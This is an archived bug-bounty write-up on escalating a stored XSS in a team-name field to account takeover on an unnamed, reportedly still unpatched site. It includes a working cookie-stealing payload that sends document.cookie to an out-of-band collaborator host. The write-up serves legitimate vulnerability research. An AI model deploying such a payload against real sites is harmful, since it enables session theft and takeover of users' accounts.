# Escalating stored XSS to Account Takeover

- **Source URL:** https://nyein-chan-aung.medium.com/escalating-stored-xss-to-account-takeover-28c549cd5f6b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20241001223832/https://nyein-chan-aung.medium.com/escalating-stored-xss-to-account-takeover-28c549cd5f6b?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7433 (id 7433)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Escalating stored XSS to Account Takeover

A few weeks ago,I was testing on a public program,

Let's call it redacted.com cause the vulnerability is still exist and I just want to show how I escalated Stored XSS to ATO.My target redacted.com has a function that can create a team.So,why don't we try some XSS or SSTI or others.

I created a team name using some html tags,such as image tag \<img/src=x> .I can fill any tags or other special chars in input field there is no restrictions but as I expected I see no incomplete image.There is only blank page on the team name.I try again using SSTI payloads,still no response.

I thought every tags I inputed were sanitized or something else,so I need to find where the team name is being reflected ,I added a member to the team and click invite button. Then an incomplete image was appeared in the team name.So the image tags I input was reflecting as an incomplete images in the team name.

I try to achieve XSS using simple XSS vector .This time I changed team name and invite a member,Boom !! I got a pop up with session cookie

This XSS triggered everytime I invite members to the team,so it's easy to get another user's cookies to takeover :D.Here is the plan,I invite a victim to my malicious team and what if the victim invite a new member to the team himself.

I crafted a XSS vector that's sending the user's cookies back to my collaborator.Here it is,

\<body onload="document.write('\<img src=\'http://qdkforffbjbcfrtshlyq2vy3ab9f66vp6.oast.fun/' + document.cookie + '\'>')">\</body>

I invited a member and when the member add a new member to the team,the stored XSS trigger and I got all session cookies of the member.

Thanks for reading,

Nyein Chan Aung.
